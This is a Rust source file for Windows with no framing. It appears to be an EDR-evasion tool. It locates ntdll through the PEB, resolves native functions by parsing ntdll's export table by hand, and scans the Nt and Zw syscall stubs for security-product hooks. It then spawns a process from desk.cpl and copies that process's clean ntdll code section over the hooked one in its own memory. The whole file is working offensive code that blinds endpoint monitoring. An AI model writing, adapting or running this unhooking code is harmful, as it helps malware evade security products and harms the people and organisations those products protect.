use ntapi::ntioapi::IO_STATUS_BLOCK;
use ntapi::ntioapi::IO_STATUS_BLOCK_u;
use ntapi::ntioapi::PIO_STATUS_BLOCK;
use ntapi::ntldr::LDR_DATA_TABLE_ENTRY;
use ntapi::ntpebteb::PEB;
use ntapi::ntpsapi::PEB_LDR_DATA;
use ntapi::winapi_local::um::winnt::__readgsqword;
use std::ffi::OsString;
use std::ffi::{CStr, OsStr};
use std::mem;
use std::os::windows::ffi::OsStrExt;
use std::os::windows::ffi::OsStringExt;
use std::ptr;
use std::slice;
use winapi::shared::basetsd::PSIZE_T;
use winapi::shared::basetsd::SIZE_T;
use winapi::shared::basetsd::ULONG_PTR;
use winapi::shared::minwindef::{DWORD, FARPROC, WORD};
use winapi::shared::ntdef::InitializeObjectAttributes;
use winapi::shared::ntdef::OBJ_CASE_INSENSITIVE;
use winapi::shared::ntdef::PULONG;
use winapi::shared::ntdef::ULONG;
use winapi::shared::ntdef::{HANDLE, LIST_ENTRY, NTSTATUS, NT_SUCCESS, OBJECT_ATTRIBUTES, POBJECT_ATTRIBUTES, PVOID, PWSTR, UNICODE_STRING};
use winapi::um::fileapi::OPEN_EXISTING;
use winapi::um::processthreadsapi::{GetCurrentProcess};
use winapi::um::subauth::PUNICODE_STRING;
use winapi::um::winnt::ACCESS_MASK;
use winapi::um::winnt::FILE_ATTRIBUTE_NORMAL;
use winapi::um::winnt::FILE_GENERIC_READ;
use winapi::um::winnt::FILE_SHARE_READ;
use winapi::um::winnt::IMAGE_DIRECTORY_ENTRY_EXPORT;
use winapi::um::winnt::IMAGE_DOS_HEADER;
use winapi::um::winnt::IMAGE_DOS_SIGNATURE;
use winapi::um::winnt::IMAGE_EXPORT_DIRECTORY;
use winapi::um::winnt::IMAGE_NT_HEADERS;
use winapi::um::winnt::IMAGE_NT_SIGNATURE;
use winapi::um::winnt::IMAGE_SECTION_HEADER;
use winapi::um::winnt::MEM_COMMIT;
use winapi::um::winnt::MEM_RELEASE;
use winapi::um::winnt::MEM_RESERVE;
use winapi::um::winnt::PAGE_EXECUTE_READWRITE;
use winapi::um::winnt::PAGE_READONLY;
use winapi::um::winnt::PAGE_READWRITE;
use winapi::um::winnt::PHANDLE;
use winapi::um::winnt::PLARGE_INTEGER;
use winapi::um::winnt::PROCESS_ALL_ACCESS;
use winapi::um::winnt::SEC_IMAGE;
use winapi::um::winnt::SECTION_ALL_ACCESS;

// Function types
type RtlInitUnicodeString = extern "system" fn(DestinationString: PUNICODE_STRING, SourceString: PWSTR);
type MyNtCreateFile = extern "system" fn(FileHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, IoStatusBlock: PIO_STATUS_BLOCK, AllocationSize: PLARGE_INTEGER, FileAttributes: ULONG, ShareAccess: ULONG, CreateDisposition: ULONG, CreateOptions: ULONG, EaBuffer: PVOID, EaLength: ULONG) -> NTSTATUS;
type MyNtCreateSection = extern "system" fn(SectionHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, MaximumSize: PLARGE_INTEGER, SectionPageProtection: ULONG, AllocationAttributes: ULONG, FileHandle: HANDLE) -> NTSTATUS;
type MyNtCreateProcessEx = extern "system" fn(ProcessHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ParentProcess: HANDLE, Flags: ULONG, SectionHandle: HANDLE, DebugPort: HANDLE, ExceptionPort: HANDLE, JobMemberLevel: ULONG) -> NTSTATUS;
type MyNtAllocateVirtualMemory = extern "system" fn(ProcessHandle: HANDLE, BaseAddress: *mut PVOID, ZeroBits: ULONG_PTR, RegionSize: PSIZE_T, AllocationType: ULONG, Protect: ULONG) -> NTSTATUS;
type MyNtReadVirtualMemory = extern "system" fn(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, BufferSize: SIZE_T, NumberOfBytesRead: PSIZE_T) -> NTSTATUS;
type MyNtFreeVirtualMemory = extern "system" fn(ProcessHandle: HANDLE, BaseAddress: *mut PVOID, RegionSize: PSIZE_T, FreeType: ULONG) -> NTSTATUS;
type MyNtTerminateProcess = extern "system" fn(ProcessHandle: HANDLE, ExitStatus: NTSTATUS) -> NTSTATUS;
type MyNtProtectVirtualMemory = extern "system" fn(ProcessHandle: HANDLE, BaseAddress: *mut PVOID, RegionSize: PSIZE_T, NewProtect: ULONG, OldProtect: PULONG) -> NTSTATUS;
type MyNtClose = extern "system" fn(ProcessHandle: HANDLE) -> NTSTATUS;

// Static variables
static mut H_NTDLL: PVOID = ptr::null_mut();
static mut RTL_INIT_UNICODE_STRING: Option<RtlInitUnicodeString> = None;
static mut NT_CREATE_FILE: Option<MyNtCreateFile> = None;
static mut NT_CREATE_SECTION: Option<MyNtCreateSection> = None;
static mut NT_CREATE_PROCESS_EX: Option<MyNtCreateProcessEx> = None;
static mut NT_ALLOCATE_VIRTUAL_MEMORY: Option<MyNtAllocateVirtualMemory> = None;
static mut NT_READ_VIRTUAL_MEMORY: Option<MyNtReadVirtualMemory> = None;
static mut NT_FREE_VIRTUAL_MEMORY: Option<MyNtFreeVirtualMemory> = None;
static mut NT_TERMINATE_PROCESS: Option<MyNtTerminateProcess> = None;
static mut NT_PROTECT_VIRTUAL_MEMORY: Option<MyNtProtectVirtualMemory> = None;
static mut NT_CLOSE: Option<MyNtClose> = None;

fn find_hooking() -> i32 {
    if unsafe {H_NTDLL.is_null()} {
        println!("Failed to get NTDLL base address");
        return 1;
    }

    let p_dos_header = unsafe {H_NTDLL as *mut IMAGE_DOS_HEADER};
    if unsafe { (*p_dos_header).e_magic } != IMAGE_DOS_SIGNATURE {
        println!("Invalid DOS header");
        return 1;
    }

    let p_nt_headers = unsafe { (H_NTDLL as usize + (*p_dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS };
    if unsafe { (*p_nt_headers).Signature } != IMAGE_NT_SIGNATURE {
        println!("Invalid NT header");
        return 1;
    }

    // Get the export directory
    let p_export_directory = unsafe {
        &(*p_nt_headers).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT as usize]
    };
    if p_export_directory.Size == 0 {
        println!("No export directory");
        return 1;
    }

    let p_export = unsafe { (H_NTDLL as usize + p_export_directory.VirtualAddress as usize) as *mut IMAGE_EXPORT_DIRECTORY };

    let p_address_of_functions = unsafe { (H_NTDLL as usize + (*p_export).AddressOfFunctions as usize) as *mut DWORD };
    let p_address_of_names = unsafe { (H_NTDLL as usize + (*p_export).AddressOfNames as usize) as *mut DWORD };
    let p_address_of_name_ordinals = unsafe { (H_NTDLL as usize + (*p_export).AddressOfNameOrdinals as usize) as *mut WORD };

    // Iterate over the export table
    for i in 0..unsafe { (*p_export).NumberOfFunctions } {
        // Function Name
        let function_name = unsafe { (H_NTDLL as usize + *p_address_of_names.offset(i as isize) as usize) as *mut i8 };

        // Function Address
        let function_address_rva = unsafe { *p_address_of_functions.offset(*p_address_of_name_ordinals.offset(i as isize) as isize) };
        let function_address = unsafe { (H_NTDLL as usize + function_address_rva as usize) as *mut DWORD };

        let syscall_stub: [u8; 4] = [0x4C, 0x8B, 0xD1, 0xB8];
        
        let function_name_str = unsafe {
            CStr::from_ptr(function_name)
                .to_str()
                .unwrap_or("<invalid UTF-8>")
        };

        if function_name_str.starts_with("Nt") || function_name_str.starts_with("Zw") {
            if unsafe { *(function_address as *mut [u8; 4]) } != syscall_stub {
                if unsafe { *function_address as u8 } == 0xE9 {
                    println!("Detected hook at address {:p} for function '{}'. Hook uses JMP instruction.", function_address, function_name_str);
                    continue;
                }

                println!("Detected hook at address {:p} for function '{}'.", function_address, function_name_str);
            }
        }
    }

    0
}

fn get_ntdll_func(lp_func_name: &str) -> FARPROC {
    let p_dos_header = unsafe{H_NTDLL as *mut IMAGE_DOS_HEADER};
    if unsafe { (*p_dos_header).e_magic } != IMAGE_DOS_SIGNATURE {
        println!("Invalid DOS Header");
        return ptr::null_mut();
    }

    let p_nt_headers = unsafe { (p_dos_header as usize + (*p_dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS };
    if unsafe { (*p_nt_headers).Signature } != IMAGE_NT_SIGNATURE {
        println!("Invalid NT Header");
        return ptr::null_mut();
    }

    let p_export_dir = unsafe {
        (p_dos_header as usize + (*p_nt_headers).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT as usize].VirtualAddress as usize) as *mut IMAGE_EXPORT_DIRECTORY
    };

    let p_address_of_functions = unsafe { (p_dos_header as usize + (*p_export_dir).AddressOfFunctions as usize) as *mut DWORD };
    let p_address_of_names = unsafe { (p_dos_header as usize + (*p_export_dir).AddressOfNames as usize) as *mut DWORD };
    let p_address_of_name_ordinals = unsafe { (p_dos_header as usize + (*p_export_dir).AddressOfNameOrdinals as usize) as *mut WORD };

    for i in 0..unsafe { (*p_nt_headers).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT as usize].Size } {
        let p_func_name = unsafe { (p_dos_header as usize + *p_address_of_names.offset(i as isize) as usize) as *mut i8 };
        let func_name = unsafe { CStr::from_ptr(p_func_name) }.to_str().unwrap();
        if func_name.eq_ignore_ascii_case(lp_func_name) {
            let ordinal = unsafe { *p_address_of_name_ordinals.offset(i as isize) };
            let func_rva = unsafe { *p_address_of_functions.offset(ordinal as isize) };
            let func = (p_dos_header as usize + func_rva as usize) as FARPROC;
            return func;
        }
    }

    ptr::null_mut()
}

fn get_nt() -> PVOID {
    let peb_base = unsafe { __readgsqword(0x60) as PVOID };
    let p_peb = peb_base as *mut PEB;
    let p_ldr = unsafe { (*p_peb).Ldr as *mut PEB_LDR_DATA };
    let head = unsafe { &mut (*p_ldr).InMemoryOrderModuleList };
    let mut p_entry = (*head).Flink;
    let nt_dll = [
        'n' as u16, 't' as u16, 'd' as u16, 'l' as u16, 'l' as u16, '.' as u16, 'd' as u16,
        'l' as u16, 'l' as u16, 0,
    ];

    while p_entry != head {
        p_entry = unsafe { (*p_entry).Flink };
        let data = (p_entry as usize - mem::size_of::<LIST_ENTRY>()) as *mut LDR_DATA_TABLE_ENTRY;
        let base_dll_name = unsafe { (*data).BaseDllName.Buffer };
        let base_dll_name_slice = unsafe { slice::from_raw_parts(base_dll_name, nt_dll.len()) };

        // Create a `let` binding for `base_dll_name_str`
        let base_dll_name_str = OsString::from_wide(base_dll_name_slice).to_string_lossy().into_owned();

        if base_dll_name_str
            .eq_ignore_ascii_case(&nt_dll.iter().map(|&c| c as u8 as char).collect::<String>())
        {
            return unsafe { (*data).DllBase };
        }
    }

    ptr::null_mut()
}

fn image_first_section(nt_headers: *mut IMAGE_NT_HEADERS) -> *mut IMAGE_SECTION_HEADER {
    unsafe { nt_headers.offset(1) as *mut IMAGE_SECTION_HEADER }
}

const IMAGE_SIZEOF_SECTION_HEADER: usize = mem::size_of::<IMAGE_SECTION_HEADER>();

fn unhook(h_proc: HANDLE) -> bool {
    let p_dos_header = unsafe { H_NTDLL as *mut IMAGE_DOS_HEADER };
    let p_nt_headers = unsafe { (H_NTDLL as usize + (*p_dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS };

    let mut clean = ptr::null_mut();
    let mut status;
    let mut virtual_size: SIZE_T = 0;
    let mut virtual_address = ptr::null_mut();

    for i in 0..unsafe { (*p_nt_headers).FileHeader.NumberOfSections } {
        let p_section = (image_first_section(p_nt_headers) as usize + (IMAGE_SIZEOF_SECTION_HEADER * i as usize)) as *mut IMAGE_SECTION_HEADER;

        let section_name = unsafe { CStr::from_ptr((*p_section).Name.as_ptr() as *const i8) };
        if section_name.to_str().unwrap().eq_ignore_ascii_case(".text") {
            let mut old: DWORD = 0;
            virtual_size = unsafe { (*(*p_section).Misc.VirtualSize()).try_into().unwrap() };
            virtual_address = unsafe { (H_NTDLL as usize + (*p_section).VirtualAddress as usize) as PVOID };

            status = unsafe {
                NT_ALLOCATE_VIRTUAL_MEMORY.unwrap()(
                    GetCurrentProcess(),
                    &mut clean,
                    0,
                    &mut virtual_size,
                    MEM_COMMIT | MEM_RESERVE,
                    PAGE_READWRITE,
                )
            };
            if !NT_SUCCESS(status) {
                println!("Failed to allocate memory: {}", status);
                return false;
            }
            println!("Memory allocated at {:p}.", std::ptr::addr_of!(virtual_size));

            status = unsafe { NT_READ_VIRTUAL_MEMORY.unwrap()(h_proc, virtual_address, clean, virtual_size, ptr::null_mut()) };
            if !NT_SUCCESS(status) {
                println!("Failed to read memory: {}", status);
                return false;
            }

            println!("Memory read successfully.");

            status = unsafe {
                NT_PROTECT_VIRTUAL_MEMORY.unwrap()(
                    GetCurrentProcess(),
                    &mut virtual_address,
                    &mut virtual_size,
                    PAGE_EXECUTE_READWRITE,
                    &mut old,
                )
            };
            if !NT_SUCCESS(status) {
                println!("Failed to change memory protection. Status code: {}", status);

                return false;
            }

            println!("Memory protection changed to execute-read-write.");

            for j in 0..unsafe { *(*p_section).Misc.VirtualSize() } as isize {
                unsafe {
                    *((H_NTDLL as usize + (*p_section).VirtualAddress as usize) as *mut u8).offset(j) =
                        *((clean as usize) as *mut u8).offset(j);
                }
            }

            status = unsafe {
                NT_PROTECT_VIRTUAL_MEMORY.unwrap()(
                    GetCurrentProcess(),
                    &mut virtual_address,
                    &mut virtual_size,
                    old,
                    &mut old,
                )
            };
            if !NT_SUCCESS(status) {
                println!("Failed to restore original memory protection. Status code: {}", status);

                return false;
            }

            break;
        }
    }

    status = unsafe { NT_FREE_VIRTUAL_MEMORY.unwrap()(GetCurrentProcess(), &mut clean, &mut virtual_size, MEM_RELEASE) };
    if !NT_SUCCESS(status) {
        println!("Memory deallocation failed. Status code: {}", status);

    }

    true
}

fn clear_ntdll() -> bool {
    let mut h_file = ptr::null_mut();
    let mut file_path = UNICODE_STRING {
        Length: 0,
        MaximumLength: 0,
        Buffer: ptr::null_mut(),
    };
    let mut oa = OBJECT_ATTRIBUTES {
        Length: mem::size_of::<OBJECT_ATTRIBUTES>() as u32,
        RootDirectory: ptr::null_mut(),
        ObjectName: ptr::null_mut(),
        Attributes: OBJ_CASE_INSENSITIVE,
        SecurityDescriptor: ptr::null_mut(),
        SecurityQualityOfService: ptr::null_mut(),
    };
    let mut iosb = IO_STATUS_BLOCK {
        u: IO_STATUS_BLOCK_u {
            Status: 0,
        },
        Information: 0,
    };


    let file_path_str = "\\??\\C:\\Windows\\System32\\desk.cpl";
    let file_path_wide: Vec<u16> = OsStr::new(file_path_str).encode_wide().chain(Some(0)).collect();
    file_path.Length = (file_path_wide.len() - 1) as u16 * 2;
    file_path.MaximumLength = file_path.Length + 2;
    file_path.Buffer = file_path_wide.as_ptr() as PWSTR;

    unsafe { InitializeObjectAttributes(&mut oa, &mut file_path, OBJ_CASE_INSENSITIVE, ptr::null_mut(), ptr::null_mut()) };

    let status = unsafe {
        NT_CREATE_FILE.unwrap()(
            &mut h_file,
            FILE_GENERIC_READ,
            &mut oa,
            &mut iosb,
            ptr::null_mut(),
            FILE_ATTRIBUTE_NORMAL,
            FILE_SHARE_READ,
            OPEN_EXISTING,
            0,
            ptr::null_mut(),
            0,
        )
    };
    if !NT_SUCCESS(status) {
        println!("Failed to open file '{}'. Status code: {}", file_path_str, status);

        return false;
    }

    println!("File handle: {:p}", h_file);


    let mut h_section = ptr::null_mut();
    let status = unsafe {
        NT_CREATE_SECTION.unwrap()(
            &mut h_section,
            SECTION_ALL_ACCESS,
            ptr::null_mut(),
            ptr::null_mut(),
            PAGE_READONLY,
            SEC_IMAGE,
            h_file,
        )
    };
    if !NT_SUCCESS(status) {
        println!("Failed to create section: {}", status);
        return false;
    }

    println!("Section handle: {:p}", h_section);


    let mut h_proc = ptr::null_mut();
    let status = unsafe {
        NT_CREATE_PROCESS_EX.unwrap()(
            &mut h_proc,
            PROCESS_ALL_ACCESS,
            ptr::null_mut(),
            GetCurrentProcess(),
            0, // Pass the appropriate flag value here
            h_section,
            ptr::null_mut(),
            ptr::null_mut(),
            0, // Pass the appropriate value for JobMemberLevel
        )
    };
    if !NT_SUCCESS(status) {
        println!("Failed to create process: {}", status);
        return false;
    }

    println!("Process handle: {:p}", h_proc);

    if !unhook(h_proc) {
        println!("Failed to unhook");
    } else {
        println!("Unhook operation completed successfully.");

    }

    let _ = std::io::stdin().read_line(&mut String::new());

    let status = unsafe { NT_TERMINATE_PROCESS.unwrap()(h_proc, 0) };
    if !NT_SUCCESS(status) {
        println!("Process terminated successfully.");

        return false;
    }

    println!("Terminated process");

    unsafe {
        NT_CLOSE.unwrap()(h_proc);
        NT_CLOSE.unwrap()(h_section);
        NT_CLOSE.unwrap()(h_file);
    }

    true
}

fn main() {
    unsafe {
        H_NTDLL = get_nt();
        RTL_INIT_UNICODE_STRING = Some(mem::transmute(get_ntdll_func("RtlInitUnicodeString")));
        NT_ALLOCATE_VIRTUAL_MEMORY = Some(mem::transmute(get_ntdll_func("NtAllocateVirtualMemory")));
        NT_READ_VIRTUAL_MEMORY = Some(mem::transmute(get_ntdll_func("NtReadVirtualMemory")));
        NT_FREE_VIRTUAL_MEMORY = Some(mem::transmute(get_ntdll_func("NtFreeVirtualMemory")));
        NT_TERMINATE_PROCESS = Some(mem::transmute(get_ntdll_func("NtTerminateProcess")));
        NT_PROTECT_VIRTUAL_MEMORY = Some(mem::transmute(get_ntdll_func("NtProtectVirtualMemory")));
        NT_CREATE_FILE = Some(mem::transmute(get_ntdll_func("NtCreateFile")));
        NT_CREATE_SECTION = Some(mem::transmute(get_ntdll_func("NtCreateSection")));
        NT_CREATE_PROCESS_EX = Some(mem::transmute(get_ntdll_func("NtCreateProcessEx")));
        NT_CLOSE = Some(mem::transmute(get_ntdll_func("NtClose")));

    }
    println!("NTDLL base address and required functions initialized.");

    if find_hooking() != 0 {
        println!("Hooking check failed.");
        return;
    }

    println!("Pre-unhooking state prepared. Press ENTER to proceed.");

    let _ = std::io::stdin().read_line(&mut String::new());

    if !clear_ntdll() {
        println!("Failed to clean NTDLL. Reverting changes.");
    }

    if find_hooking() != 0 {
        println!("Hooking check failed after unhook attempt.");
        return;
    }

    let _ = std::io::stdin().read_line(&mut String::new());
    println!("Process completed. Press ENTER to exit.");

}

